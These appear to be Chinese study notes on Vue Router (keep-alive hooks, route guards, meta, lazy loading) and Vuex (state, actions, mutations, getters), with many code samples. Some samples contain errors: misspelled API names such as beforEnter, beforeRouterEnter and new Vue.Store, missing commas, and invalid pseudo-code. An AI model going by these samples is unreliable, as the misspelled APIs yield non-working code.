该方式只能在 router-view 被 keep-alive 包裹起来之后使用 使用 activated() { ... } 当该组件处于活跃状态的时候, 修改路径

使用 beforeRouteLeave(to, from .next) { ... }  
要离开该组件的时候, 把路径保存起来, 为的就是记录离开时的状态
```js 
activated() {
  // 当该组件处于活跃状态的时候, 修改路径
  this.$router.push(this.path);
},

// 我们使用在组件内的导航守卫 
beforeRouteLeave(to, from, next) {
  // 为了记录上一次离开时候的状态 我们使用了这个组件内的导航守卫 
  // 离开该组件的时候 要把离开的组件路径记住, 然后把这个路径保存给this.path 就是为了记录上一次离开时的状态
  // 导航离开该组件的对应路由时调用

  console.log(this.$route.path);
  this.path = this.$route.path;
  next();
}
```

<br><br>

# 补充生命周期:
以前我们在mounted函数里面开启定时器 在组件即将被销毁的函数里面关闭定时器  

但是有一个问题 路由组件在切换的时候 有的时候不会关闭定时器 比如嵌套的结构
所以我们可以利用下面的两个路由组件的生命周期函数


### **activated() { }**
处于活跃状态的时候执行该回调    激活 (组件出现在你面前)
```
在这个函数中开启定时器
```

<br>

### **deactivated() { }**
不处于活跃状态的时候执行该回调  失活 (组件消失在你面前)
```
在这个函数中关闭定时器
```

<br>

### **nextTick(function() { })**
这个不是路由组件的生命周期  
当修改了数据之后 vue帮我们操作完dom之后 把真实的dom放在页面了 就会调用这个函数

nextTick原理:
- 异步说明  
Vue 实现响应式并不是数据发生变化之后 DOM 立即变化 而是按一定的策略进行 DOM 的更新

- 事件循环说明:  
简单来说 Vue 在修改数据后 视图不会立刻更新 而是等同一事件循环中的所有数据变化完成之后 再统一进行视图更新。

- created、mounted:
在 created 和 mounted 阶段 如果需要操作渲染后的试图 也要使用 nextTick 方法。
注意 mounted 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕 可以用 vm.$nextTick 替换掉 mounted

<br><br>

# 路由守卫
古代有御前侍卫 是保护君王的安全 路由守卫就是保护路由的安全(权限) 我想让你看什么 或者 不想让你看什么

比如有些导航按钮 我们需要在满足一些条件之后才能点的时候 比如用户的个人中心 我们是不是需要验证看看是否登录

``` 
Home      这个随便点
About      这个随便点

  News      只有学校是尚硅谷 才能点
  Message   只有学校是尚硅谷 才能点
```

比如我们把学校存在localStorage里面  
school: atguigu

也就是说 我们在点击 News Message 的时候我们需要校验一下 看看学校是不是atguigu 如果是再呈现给用户

<br>

### **鉴权:**
- 首先把权限数据放入一个公共的位置 比如 
```
vuex localStorage meta
```

- 然后点击按钮的时候 我们需要校验下权限

<br>

### **点击路由按钮后的流程**
```
用户点击导航区  ---  
    引起了路径的改变  ---  
        前端路由器监测到然后进行规则的匹配  ---  
            在合适的位置呈现组件
```

我们在上述的哪一个环节中加入校验最为合适  --- **前端路由器监测到然后进行规则的匹配** 这个环节

我们跟路由器说 假如以后有人访问的是 /home/news 你能去localStorage里面的 school看看值是不是atguigu如果是你就正常的呈现组件 如果不是 你就不要呈现组件

我们要在router的配置文件中进行配置守卫 回到router文件夹下的index.js文件 在暴露路由对象前 我们添加路由守卫
```js 
const router = new VueRouter({
  routes: [
    {
      name: 'shouye'      // 路由的别名
      path: '/home',
      component: Home
    }
  ]
})

router.beforeEach((to, from, next) => {})

// 最后暴露
export default router
```


### **全局前置路由守卫:**
**<font color="#C2185B">router.beforeEach((to, from, next) => {})</font>**  
在每一次路由切换之前 都会调用这个函数 初始化的时候也会被调用

**参数:**   
**<font color="#C2185B">to: </font>**   
你要去哪 它是一个对象 要跳过去目标的路由信息

```
里面有 hash query params name meta matched等属性或对象 就是目标的route
```

<br>

**<font color="#C2185B">from: </font>**   
你从哪里来 它是一个对象 目前所处位置的路由信息

<br>

**<font color="#C2185B">next(): </font>**   
用于放行 该流程才能继续走下去

**形式1: 不传**    
表示放行

**形式2: false**  
中断当前的导航 如果浏览器的url发生变化 那么会重置到 from 路由对应的地址i

**形式3: 路径**  
跳转到一个指定的接口

**形式4: 对象**   
该对象就是 push() router-link to 绑定的传参对象
```js
next({
  path: "/"
})
```

**形式5:error**  
如果传入 next 的参数是一个 Error 实例，则导航会被终止且该错误会被传递给 router.onError() 注册过的回调。

<br>

### **应用场景:权限**
怎么应用这个 全局前置路由守卫呢？  我们可以判断一下什么时候放行 什么时候不放行
```js 
// 比如 学校名是atguigu就放行 或者我们已经拿到了要去哪个路由 我们可以根据to身上path判断也可以

router.beforeEach((to, from, next) => {
  if(localStorage.getItem('school') === 'atguigu') {
    next()
  }
}) 

// 如果是多个路由都要进行判断怎么办？ 再包一层if
router.beforeEach((to, from, next) => {
  if(to.path === '/home/news' || to.path === '/home/message') {

    if(localStorage.getItem('school') === 'atguigu') {
      next()
    }

  // 上面是当是那两种情况我们加上限制 如果不是那两种情况我们就要放行
  } else {    
    next()
  }
}) 
```


上面有一个地方不太好 就是我们对某一些按钮进行限制的时候要对它们进行判断 但假如有12个按钮 难道我们要在这里写12个条件么？
```js 
if(to.path === '/home/news' || to.path === '/home/message')
```

怎么解决这个问题呢？  
就是给每一个路由配置里面添加一个特殊的属性 用于标识着本路由是否需要进行权限的校验

我们在路由配置规则(routes)里面加上这个属性后 to 和 from都能看到 我就可以直接验证 to.peiqi 这个属性是不是true 就需要进判断 如果是false那就是不需要进行权限的校验

路由组件身上有什么信息 我们可以输出 this.$route 那这个特殊的属性 加在 路由配置对象的哪里呢？ **meta**

<br>

### **meta 路由元信息**
它是routes中的一个配置想 值是对象类型

**作用:**   
在meta中我们可以放一些 程序员自定义的信息

我们想放的特殊的数据 router免费给我们提供的一个容器可以随意往里放东西

<br>

结合上面的例子 我们可以在meta中放置一个特殊的标识属性 代表是否授权 isAuth  

谁需要权限的校验meta配置项就放在对应的路由规则里面 isAuth: true 就代表该路由需要权限的校验  

<br>

路由组件身上有什么信息 我们可以输出 this.$route 

<br>

### **技巧:** 
不用每一个路由规则里面都写 isAuth: true 或者 isAuth: false 不写的路由规则里 没有就是undefined 就是false呗
```js 
routes: [
  {
    name: 'guanyu',
    path: '/about',
    component: About,

    // 我们在meta中输入些 自定义的数据 isAuth 用于标识该路由是否需要进行权限的验证
    meta: {
      isAuth: true
    }
  }
]

router.beforeEach((to, from, next) => {

  // 判断是否需要鉴定权限
  if(to.meta.isAuth) {

    if(localStorage.getItem('school') === 'atguigu') {
      next()
    }

  } else {
    next()
  }
}) 
```

<br>

### **后置路由守卫**
**<font color="#C2185B">router.afterEach((to, from) => {})</font>**  
该函数会在初始化的时候 和 每次路由切换之后被调用 切换已经切完了 后置路由守卫没有next 因为来都来了

to from也是路由信息

**应用场景:** 
我们每切换一次路由的时候 页签的title可以跟着变化

```js 
// js里可以使用 document.title 比如我们可以在 meta 当中给每一个路由规则里面都配置一个title
meta: { title: '关于' }

router.afterEach((to, from) => {
  document.title = to.meta.title || '硅谷系统'
})
```

<br>

### **独享路由守卫**
一个路由单独想用的路由守卫  
比如我们一个项目里面有很多的路由 但是我只想用路由守卫对一个路由进行限制

比如我们的组件有首页 关于 新闻 消息 等 我们现在只想对 关于页面进行权限监测 那么就可以在这个关于的页面里面 配置 一个路由守卫

我们在一个路由规则里面配置 独享路由守卫
```js 
  routes: [
    {
      name: 'guanyu',
      path: '/about',
      component: About,

      beforEnter: (to, from, next) => { ... }
    }
  ]
```

**<font color="#C2185B">beforEnter: (to, from, next) => { }</font>**  
在某一个路由的配置项里面进行配置 如上 某一个路由独享的守卫

<br>

**注意: 独享路由守卫只有前置没有后置**

<br>

### 组件内的路由守卫
也就是在组件里面写路由守卫 而不是在路由的配置文件里面写 都写在组件内的配置项里面 和 methods等 同级

<br>

**<font color="#C2185B">配置项: beforeRouterEnter(to, from, next) { ... }</font>**  
'通过路由规则进入' 该组件时被调用 进入之前会调用 比如我们直接写组件标签 渲染出来的组件就不会调用这个函数

<br>

**<font color="#C2185B">配置项: beforeRouterLeave(to, from, next) { ... }</font>**  
'通过路由规则离开' 该组件时被调用 走之前会调用

<br>

**应用场景:**  
比如判断权限 只是对这个组件起作用

**注意:**
只有全局路由守卫分前置和后置 前置是进入前

<br><br>

# 路由的懒加载
当打包构建应用时, js包会变得非常大, 影响页面的加载  

如果我们能把不同路由对应的组件分割成不同的代码块, 然后当路由被访问的时候才加载对应的组件, 这样就更加高效的

之前我们自己配置webpack打包的时候  
我们打包的时候会打包入口js文件, 这样所有的东西都打包在这个入口js文件里后, 这个js文件就会变得非常的大

这样当我们去静态资源服务器里第一次请求资源的时候, 就要花费过长的时间因为js文件太大了, 所以在请求的过程当中浏览器会出现短暂的空白的  

而且 我们自己使用webpack配置打包的时候, 并没有把css文件单独做抽离, 相当于是在js文件里面包含的

而脚手架配置的时候, 就发现了这个问题, 对我们的js文件和css文件进行了分包
脚手架配置的webpack会对css文件做分离处理

脚手架打包后的目录结构:
```
  | - dist
    | - static
      | - css
        .css文件  该项目所有的css相关文件 打包到这里

      | - js
        
        appxxxx.js
        当前应用程序开发的代码都在这里面 自己写的业务代码都在这里

        manifestxxx.js
        为我们打包的代码最低层支撑的, 我们在项目开发的时候用了很多的模块化导入导出, 在项目开发里面既可以用es6导出 也可以用commonjs 但是根本就不支持commonjs 为了让它有效能让浏览器识别 这样的代码都放在这里了

        vendorxx.js   
        在项目里引用的第三方的东西(比如vue vue-router axios) 只要是第三方的东西vue在打包的时候都会打包在这里
```

上面我们大致了解了vue在给项目打包的时候会把js 和 css文件进行分别处理, 所有css相关的文件会放到css文件里

js文件也会按照, 第三方框架 -- 底层支撑 -- 业务逻辑 分成这三个js文件, 当我们的项目慢慢做大的时候, 业务逻辑代码量也会相应的增加, 就会造成一个问题, 我们用户在第一次向静态服务器请求资源的时候, 由于加载的js文件大而且过多, 页面会出现短暂的空白

所以我们在真是开发中, 通常会选择一个路由打包成一个js文件, 默认的情况下并不会跟整个资源一起请求过来

比如用户点开界面展示的是首页, 那就把首页对应的js文件请求过来就可以了, 至于其他的模块先放到服务器里, 我现阶段值请求了一个

<br>

### **如何避免这种情况呢?**
使用路由的懒加载
将不同的理由对应的组件打包到不同的js文件里面

<br>

### **路由懒加载做了什么?**
路由看加载的主要作用就是将理由对应的组件打包成一个个的js代码块
只有在这个理由被访问到的时候, 才加载对应的组件

<br>

### **懒加载的方式**
### **方式一: 不推荐**
异步组件:
```js 
const Home = resolve => {
  require.ensure(['../components/Home.vue'], () => {
    resolve(require('../'components/Home.vue'))
  })
}
```

<br>

### **方式二: AMD写法**
```js
const About = resolve => require(['../components/Home.vue'], resolve);
```

<br>

### **方式三: 推荐**
在es6中, 我们可以有更加简单的写法来组织vue异步组件和webpack的代码分割
```js
const Home = () => import('../components/Home.vue')
```

<br>

### **总结:**
实现路由懒加载就是把以前普通的导入方式 修改为 通过函数调用的方式  
一个懒加载会对应一个js文件

```js 

  // 把下面三种导入 删掉 
  --- 删除 --- > import Home from '../components/home'
  --- 删除 --- > import About from '../components/about'
  --- 删除 --- > import User from '../components/User'

  // 把上面的形式修改为路由懒加载
  const Home = () => import('../components/home')
  const About = () => import('../components/about')
  const User = () => import('../components/User')
  

  // 再在下面时候 Home About User
  const routes = [
  {
    path: '/',
    redirect: '/home'
  },

  {
    path: '/home',
    component: Home
  },
  {
    path: '/about',
    component: About
  },
  {
    path: '/user/:userId',
    component: User
  }
]
```

<br><br>

# Vuex补足
### **1. A模块的 actions中 还可以分发到 B模板的 actions 中**

<br><br>

# Vuex
### **概念:** 
专门在vue中实现集中式状态(数据)管理的一个vue插件 对vue应用中多个组件的共享状态进行集中式的管理(读/写) 也是一种组件间通信的方式 且适用于任意组件间通信

**注意:** 
它是一个插件哦 Vue.use(Vuex) 响应式的, 管家内部的变量被改变的时候 界面自动刷新

<br>

### **什么时候使用vuex**
多个组件依赖于同一状态(数据)  
不同组件的行为需要变更同一状态(也就是别的组件的操作都会修改vux中的数据) 也就是共享

<br>

### **状态管理到底是什么?**
状态管理模式, 集中式存储管理这些名词听起来就非常高大上, 让人捉摸不透, 其实 可以简单的将其看成, 把需要多个组件共享的变量全部存储在一个对象里面

然后将这个对象放在顶层的Vue实例中 让其他组件可以使用, 那么多个组件是不是就可以共享这个对象中的所有变量属性了呢?

而且所有组件可以读取vuex中的数据 同时所有组件也可以修改vuex中的数据 其它组件看到的是数据被修改后的值

我们可以把上述中说到的状态, 理解为一个变量 现在我们要用这个变量存储这个状态 这个状态就是数据

当很多个组件都想用到这个状态的时候  
(组件是一个树结构, 将状态放在哪个组件里都不合适, 因为底层C组件想用顶层A组件的状态时, 需要从顶层层层传递到底层组件)

我们可以 new一个专门的对象, 我们把new出来的这个对象当做是一个管家 这个管家帮我们管理这个状态

```   
  (所有组件的状态都交给管家来管理就是集中式)
这个数值需要共享, 我们就在公共的部分创建这个对象

              对象: 管家
                count:0  

  组件A         组件B         组件C
```

<br>

### **Vuex帮我们管理的常用状态**
我们所说的状态, 这个状态会在多个界面间共享的问题 比如 
- 用户的登录状态(token)
- 用户名称
- 头像
- 地理位置信息
- 商品的收藏
- 购物车中的物品等等

这些状态信息, 我们都可以放在同一的地方, 对它进行保存和管理, 而且它们还是响应式的

<br><br>

# Vuex - 单界面 到 多界面状态管理的切换
在单个组件中进行状态管理是一件非常简单的事情

### **单组件中的数据 行为 页面之间的关系**
```
      在单界面中有3个角色

         Actions

      ↗         ↘

  View      ←        State
```

### **State:**
用于存储当前这个界面或者这个组件里面的状态(数据)  
前面说了我们是通过变量来保存状态 而单个组件中的变量一般保存在
```
data() {return {这里}} 
```

所以对于我们单个组件来说, State相当于我们的data 如果data里面定义多个变量 就相当于保存了多个状态 而data中的状态是放在View里面显示的 

<br>

### **View**
View里面引用了也data中的状态 通过{{}}显示在页面中做了展示  
而View里面又产生了一些行为(Actions) 比如用户发生了点击

<br>

### **Actions**
一旦发生了Actions的时候 会返回来修改State中的状态  
上面就是单页面的状态管理 上面的三个角色都是在一个.vue文件中进行管理的 接下来我们看看vuex是怎么用的

<br>

### **原理图**
``` 
          Backend API
              ↑
              ↓
            Actions   -Commit- 
                              ↘
  Disp↗atch

Vcomponent                   Mutations   ← →   Devtools
    
  ↑                            ↙
   -Render-  State     < -Mutate-
```

上面图里属于 Vuex部分的三个角色 分别是  
- Actions: 一堆行为
- Mutations: 修改 加工 维护
- State: 状态 也就是数据

Actions里面可以跟后端进行交互 发起异步任务

我们前面说的要数据交给Vuex来进行管理 其实说的就是State对象也就是说 我们将数据放在了 State对象里面 这里面能保存很多数据

<br>

### **解析原理图**
我们先说下需求 我们在vuex存放了一个求和的数据 count
然后我们在组件内部 选择加几 和 加 减 来操作vuex中的数据

首先 我们从 Vcomponent 的角度出发 要是想使用vuex 就必须按照vuex的流程来走 我们调用 dispatch函数传入两个参数 加还是减 加几减几也就是动作类型和数据 然后通过dispatch分发到Actions对象里

**参数:** 
type    
data

```js 
dispatch(动作类型 数据)
```

然后我们传递的值就会到 Actions对象 里面  
*Actions也是一个对象* 里面会有我们传递的数据  

只要我们组件内dispatch里面的动作 和 Actions里面的动作能对上(*匹配*) 该函数就会被调用 函数内部就能收到我们传递的数据 也就是加几 减几
```js 
// Actions对象
{
  jia: function(2) { ... }
}
```

用户在组件内调用 dispatch 的时候 第一个响应用户的就是acitons
然后 在上面jia的函数里面 我们自己调用commit 将加和要加的数据提交到Mutations里面
```js
methods: {
  // 这里的方法 和 actions 中的方法对应上了
  jia: function(2) {
    commit(jia, 2)
  }
}
```

commit会提交到 **Mutations** 它的类型 **也是一个对象**  
这个对象里面也有我们传递过来的jia函数(匹配) 函数里面有整个vuex里state对象 还有我们要操作的数据2

参数:  
**state**  
data 

真正完成逻辑的地方再 Mutations 里面
```js 
// Mutations对象
{ 
  // 这里也有 jia 方法
  jia: function(state, 2) {
    state.sum += 2
  }
}
```

最后state中保存的数据就会发生变化 而且state中的数据发生变化之后 会重新调用render解析模板 做到响应式 

<br>

### **注意:**
**<font color="#C2185B">action的作用:</font>**   
上面的actions感觉没有用处是么 如果我们在dispatch的时候 提交了一个动作 但是*动作对应的数据 需要发ajax请求问服务器才能知道的时候*

这个异步的动作需要在actions里面完成  
也就是说 当我们做的是*同步的动作的时候* 我们*可以直接在组件内部commit到Mutations里面* 当我们的操作是*异步的时候* 我们*还是需要在actions里面做*

这也就是上面流程图的一圈 下面我们会仔细研究怎么使用vuex
还有一个问题 我们需要调用dispatch commit等方法 这些方法都在store身上 所以我们还要让所有的组件都能看到store
 
<br>

### **Vuex的使用:**
vuex是插件, 所以我们还是要先下载

### **安装Vuex**
```
npm i vuex --save
```

<br>

### **创建store文件夹 引入Vuex 并注册插件 (配置)**
引入 Vue: 目的使用 use() 注册插件
```
import Vue from 'vue'
```

引入 Vuex
```
import Vuex from 'vuex'
```
```
当我们Vue.use(Vuex)后 全局就多了一个 $store对象 可以通过该对象拿到 Vuex中的数据  
同时我们在入口文件中也需要引入 暴露出去的 store 对象 将store挂载在上面 这样vm vc身上都能看到$store对象
```

注册 Vuex
```
Vue.use(Vuex)
```
```
相当于进行了下面的操作: 
只有在Vue中挂载后 它才会给Vue的原型添加 $store
其它组件才可以通过 $store 来拿到我们创建的vuex 这样多个组件才能去仓库中取东西 Vue.prototype.$store = store
```

<br>

### **创建store对象 配置 并 导出**
```js
const store = new Vuex.Store({})

export default store
```

**示例:**
```js 
// store文件夹中的 index.js 文件 该文件用于创建Vuex中最为核心的store
import Vuex from 'vuex'
import Vue from 'vue'

// 我们必须跟store的文件一起 注册vuex
Vue.use(Vuex)

// 准备actions:  用于响应组件中的动作
const actions = {}

// 准备mutations:  用于操作数据(state)
const mutations = {}

// 准备state:  存储数据
const state = {}


// 创建store
const store = new Vuex.Store({
  actions,
  mutations,
  state
})

export default store
```

### **入口文件 引入 store 并挂载**

<br>

### **如何获取Vuex中的数据?**
**<font color="#C2185B">$store.state.counter</font>**  
创建完store对象后 就会有 $store 对象 我们可以通过this.$store的方式获取 *注意模板中可以不用写this*

其它组件可以通过 $store 对象获取 仓库中的公共变量

<br>

### **new Vue.Store()中的配置对象**
固定的5个
```js 
const store = new Vue.Store({

  // 1. 
  state: { },

  // 2.
  mutations: { },

  // 3.
  actions: { },

  // 4.
  getters: { },

  //5.
  modules: { }
})
```

```html
<!-- App.vue -->
<template>
  <div id="app">
    <h3>{{message}}</h3>

    <!-- 这种直接在组件中改变store中的变量的方式不推荐 -->
    <button 
      @click='$store.state.counter++'>
      按钮1
    </button>
    <button 
      @click='$store.state.counter--'>
      按钮2
    </button>
    <p>{{$store.state.counter}}</p>

    <hello-vueX></hello-vueX>
  </div>
</template>

<script>
import HelloVueX from './components/HelloVueX.vue';

export default {
  name: 'App',
  data() {
    return {
      message: '我是App组件'
    }
  },
  
  components: {
    HelloVueX
  }
}
</script>


<!-- HelloVueX.vue -->
<template>
  <div>
    <h3>在这个组件中也要展示App.vue中的count变量</h3>
    <p>{{$store.state.counter}}</p>
  </div>
</template>

<script>
export default {
  name: 'HelloVueX',
}
</script>


<!-- vuex index.js -->
<script>
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

const store = new Vuex.Store({
  state: {
    counter:1000
  },

})

export default store


// 入口js文件
import Vue from 'vue'
import App from './App'
import router from './router'
import store from './store/index'

Vue.config.productionTip = false

new Vue({
  el: '#app',
  router,
  store,
  render: h => h(App)
})
</script>
```

<br><br>

# 多界面状态管理
上面的代码中 我们简单实用vuex来存储了一个可以让多个组件之间共享的变量 couter

我们把这个counter装在了store中的state对象中, 这个多个组件之间都可以使用 $store.state.counter 访问到这个变量

```
$store.state.变量
```

就是vuex提供给我们访问公共变量的格式 上面说的是访问 修改也是一样的 下面会说下 当修改的时候 我们应该怎么操作

<br>

### **简单的说下什么是多界面状态管理**
Vue已经帮我们做好了单个界面的状态管理, 但是如果是多个界面呢?

多个视图都依赖同一个状态(一个状态改了, 多个界面需要进行更新)  不同界面的Actions都想修改同一个状态(Home.vue需要修改, Profile.vue也要修改这个状态)

也就是说对于某些状态(状态1, 状态2, 状态3)来说只属于我们某一个视图, 但是也有一些状态(状态a, 状态b, 状态c)属于多个视图共同想要维护的

状态1, 状态2, 状态3 你放在自己的房间中, 你自己管理自己用 没问题  
状态a, 状态b, 状态c 我们希望交给一个大管家来统一帮助我们管理

Vuex就是为我们提供这个大管家的工具

<br>

### **全局单例模式(大管家)**
我们现在要做的就是将共享的状态抽取出来, 交给我们的大管家 统一进行管理 之后 你们每个视图 按照我规定好的规定, 进行访问和修改等操作 比如

我们是通过 $store.state.变量 访问  
修改 的话也有固定的格式 先往vuex里面进行提交, 提交之后vuex再进行修改

这就是Vuex背后的基本思想

<br>

官方推荐的 修改 vuex 中共享变量的流程图:
```js 

                   Actions
      dispatch↗              ↘commit

Vue Components                        Mutations         Devtools

          render↖            ↙mutate
                    state
```

<br>

### **从上图 Vue Components(组件) 起点开始**
组件中可以使用 vuex state中的变量

但是修改state中的变量的时候 vuex希望我们先分发一个actions 然后在提交到mutations
```
页面 -> actions -> mutations
```

不要在其他的任何地方修改state 要是修改的话只能通过mutations来修改 为什么呢?

**Devtools: vue开发的浏览器插件**  
这个插件可以帮我们记录每次修改state的状态 如果绕过了上面的环节 Devtools 就跟踪不到了
``` 
因为现在是三个组件共享一个state变量, 那state中的状态的更改可能是来自多个地方的, 如果多个组件都在修改state的话 很难跟踪到哪个组件修改这个状态了

而Devtools可以记录每一次state被修改时的状态 我们就可以跟踪到哪一个组件改错了, 如果绕过了上面的环节 Devtools 就跟踪不到了
```
  
<br>

### **提交到Actions和直接提交到Mutations区别**
其实我们也不用先通过Actions再提交到mutations的顺序来修改  
我们可以从 Vue Components 的位置直接提交到 mutations去修改state中的变量

**区别是:**
当有有异步操作不要直接提交到在Mutations中, Mutations都是同步操作 如果Mutations中有异步操作 Devtools也跟踪不到

如果有异步操作的时候要先分发到Actions中, 由Actions提交到Mutations中的就变成同步操作了

什么情况下会进行异步操作?? *发送网络请求*

<br><br>

# Vuex的基本使用 (每个环节内匹配处理函数)
我们将一个数据放入到Vuex中

<br>

### Vuex Store中的 state 配置项
**将状态数据配置到Vuex state对象中**  直接放在 store.js 文件中的 state 对象里面即可
```js 
// 准备state:  存储数据
const state = {
  sum: 0    // 将数据直接放在 state里面
}

// 创建store
const store = new Vuex.Store({
  actions,
  mutations,
  state
})
```

组件中怎么使用Vuex里面的数据

<br>

### Vuex Store中的 actions 配置项
**在组件中 调用 dispatch() 将对应的逻辑交给 actions 对象中的对应函数去处理**

**<font color="#C2185B">this.$store.dispatch(actions中配置好的处理函数, 数据)</font>**  
```js 
// B组件的methods
add() {
  this.$store.dispatch('add', this.n)
    // 将加的处理逻辑 交给在 actions 对象中配置好的 处理函数中
}
```

<br>

### **在store中的 actions 对象里面 创建 组件分发过来的同名处理函数**

**actions中的函数的参数:**  
**<font color="#C2185B">context:</font>**   
也有人叫他miniStore 因为里面有一些方法 跟store中一样但没store多 也有人这么理解 它叫做上下文也就是说 往上看看 往下看看 这个函数可能会遇到的所有方法组合成一个对象提供给你调用

比如 commit 方法就封装在context里面 context中有
- commit
- dispatch
- getters
- state

<br>

**<font color="#C2185B">value:</font>**   
组件中dispatch传递过来的参数

在组件中会调用 $store.dispatch()   
dispatch会指定一个store中的actions对象中的已存在的处理函数(和分发的函数名相同) 其目的就是将组件中的事件内的逻辑交给actions中对应的处理函数去处理 而不是组件内部处理  

```js 
// store index.js 中的 actions
const actions = {
  add(context, value) {
    
    // 组件中dispatch指定的处理函数 该函数名必须和dispatch中指定的函数名一致
    context.commit('add', value)
  }
}
```

随后 actions 会将对应的处理逻辑 通过 commit() 提交到 mutations 中

<br>

**也可以理解为:**  
组件 -- 指定了 actions 的对应处理函数 -- mutations 里面也要有对应的处理函数
```
A - A - A
```

<br>

**扩展:**  
actions对象中的函数 有commit state还能理解 那为什么要有 dispatch 呢？

dispatch它用来干什么？  
我们在一个actions函数中 如果处理太多的逻辑 会让整个代码看起来非常的复杂 这时候我们就可以将分函数来处理整个的逻辑 

我们可以在 actions 对象中定义多个 方法 利用dispatch()分发到指定的方法中做对应的逻辑 最后在分发到 mutations 中

```js 
const actions = {
  add(context, value) {
    context.dispatch('demo1', value)
  }

  // 传递逻辑到demo1
  demo1(context, value) {
    context.dispatch('demo2', value)
  }

  // 传递逻辑到demo2 然后demo2做最后的提交
  demo2(context, value) {
    context.commit('add', value)
  }
}
```

<br>

### Vuex Store中的 mutations 配置项
**在store中的 mutations 对象里面 创建 和actions一样的处理函数**  

**mutations中的函数的参数:**  
**<font color="#C2185B">state:</font>**   
我们数据存放的地方

<br>

**<font color="#C2185B">value:</font>**   
组件传递过来的数据

<br>

**技巧:**  
可以在mutations 里面定义大写常量级别的函数名 在actions里面commit到这个函数名上  
也就是说actions没起什么作用直接把要做的事情传递到了mutations里面 然后mutations才是真正工作的人 所以它能拿到state中的数据

```js 
const mutations = {
  add(state, value) {
    state.sum += value
  }
}
```

**<font color="#C2185B">注意:</font>**  
我们修改的是 state 当中的某个数据 并不是 state对象
```
state = data        x
state.msg = data    o
```

<br>

### **模板中使用 store中state里面的数据**
```html
<li> {{ $store.state.sum }} </li>
```

<br>

**注意:**
一般来讲 我们在组件内部只写dispatch到actions中的哪个处理函数  
也不写太多的逻辑 太多的逻辑可以在actions里面来处理  
主要的逻辑都可以在 actions 里面完成
```js 
// 组件内部
incrementOdd() {
  if(this.$store.state.num % 2) {
    this.$store.dispatch('incrementOdd', this.n)
  }
}


// store的action对象的add
incrementOdd(context, value) {
  if(context.state.sum % 2) {
    context.commit('incrementOdd', value)
  }
}
```

在 mutations 里面不要写过多的逻辑 也不要写异步任务 比如ajax请求  
也就是说 整个操作store中的数据的逻辑 

1. 组件中 只写 dispatch指定哪个actions中的处理函数
2. actions中的处理函数 可以负责写逻辑
3. mutations中的函数 只写直接怎么操作数据

<br>

**细节:**  
如果 actions 中不用太多的逻辑 或者理解成没有异步的任务的时候 我们可以直接
```
组件 --- > mutations
this.$store.commit('mutation中定义好的函数', value)
```

<br>

**技巧:**  
一般actions中的函数名小写 mutations里面的函数名大写 这样的好处是*在开发者工具中能够直观的看到*

actions看似没有用处 但是当业务逻辑一复杂 我们在actions里面定义逻辑 这里面的逻辑只有一套 很多组件公用这一套

*如果复杂的逻辑放在组件自身 不方便复用*

```js 
// store.js
const state = {
  str: "sam",
}

const actions = {
  modifyStr(context, value) {
    context.commit("MODIFY_STR", value)
  }
}

const mutations = {
  MODIFY_STR(state, value) {
    state.str = value
  }
}


// 组件内部
changeName() {
  this.$store.dispatch("modifyStr", "erin")
}


//actions 和 mutations 的函数中都能收到两个参数 context / state 和 value(组件传递的数据)
```

<br><br>

### **mutations 的案例:**
之前我们在页面上修改vuex中的变量都是 +1 -1 我现在希望 +5 +10 也就是组件要告诉mutations怎么修改 修改多少
```js 
// 组件中 标签内部绑定事件, 并传入实参
<button @click='addCount(5)'>按钮3</button>

// 直接提交到 mutations 中
addCount(count) {
  this.$store.commit('incrementCount', count);
}

// vuex中 mutations 对象中
incrementCount(state, count) {
  state.counter += count
}
```

<br>

### **this.$store.commit() 参数的写法:**
之前我们提交的时候都是
```js 
// payload就是数据
this.$store.commit('事件类型', payload)
```

我们还可以在 commit() 的时候传递一个对象
```js
this.$store.commit({})
```

参数对象中的属性:
```js
{
  type: "mutations中设置的方法名",
  payload: 数据
}
```

```js
// 组件
this.$store.commit({
  type: '事件类型 也就是mutations中对应的处理方法名',
  payload: count
})

// Mutation
incrementCount(state, payload) {
  state.counter += payload.count
}
```

<br>

### Vuex Store中的 getters 配置项
这个配置项都没有出现在vuex的原理图里 就说明它不是一个必须的配置项  

当state中的数据 组件在使用的时候并不是直接拿来用 而是state中的数据乘10加100后 组件里在使用 也就是说这个数据要经过很多逻辑的运算之后的结果

那在哪完成比较好？  
组件？ 组件内完成之后该组件能使用 不适合复用  
vuex？对在vuex里面完成其它组件可以直接拿到 复杂逻辑后的数据 方便复用

<br>

### **作用:**
getters配置项主要用来对state中的数据进行加工 方便组件调用加工后的数据起到复用的效果 *像极了 data 和 computed 的关系*

<br>

### **页面使用 getters 中的数据:**
```js
$store.getters.变量
```

<br>

### **getters的使用**
跟 计算属性 一样定义一个变量 把这个变量写成函数 然后直接使用 函数名 就可以  
getters配置项的类型是一个对象

```js
const gettes = {

}
```

类似计算属性那样 我们传入一个 函数 函数名做为属性名

**函数参数:**  
函数中能够获得 state 参数  
函数中能够获取 getters 参数 (getters就是getters对象本身用于调用getters对象中其它"计算属性")

**返回值:**  
返回值作为函数名的结果

```js 
const state = {
  msg: "我是store中的数据: hello, vuex"
}

// 用于将state中的数据进行加工
const getters = {
  process(state, getters) {
    // 在 msg 的后面  + !
    return state.msg + "!"
  }
}

  
// 页面中的使用
<div>store:  {{$store.state.msg}}</div>
// 这里就是计算属性的用法 写的是 方法名
<div>getter: {{$store.getters.process}}</div>
```

<br>

### **getters的案例1:**
将vuex中的共享属性 students 展示到组件中, 要求展示年龄大于20岁的

**方式1: 组件内使用 计算属性**  
我们可以在组件中定义计算属性, 然后做完处理后展示在组件的模板中, 但是有个问题, 当我其它的页面都需要展示这个结果, 同样的代码还要继续再写一遍

```js 
// store 
state: {
  counter:1000,
  students: [
    {id:1, name:'sam', age:28},
    {id:2, name:'erin', age:18},
    {id:3, name:'nn', age:8}
  ]
}


// 组件 在组件中我们使用了 计算属性 来达成目的
computed: {
  clac() {
    return this.$store.state.students.filter(item => {
      return item.age >= 18;
    })
  }
}
```

<br>

**方式2: store中使用getters**    
所以我们可以在getters中处理好等其它组件来调用
```js 
// store index.js
getters: {
  calc(state) {
    return state.students.filter(item => item.age > 10);
  }
}

// 组件调用
<p>{{$store.getters.calc[0].name}}</p>
```

<br><br> 

**需求2:** 获取 vuex state 中的 students中的年龄大于10的学生 和 个数

```js 
<p>{{$store.getters.calc}}</p>

// 这样就能拿到个数了
<p>{{$store.getters.calc.length}}</p>
```

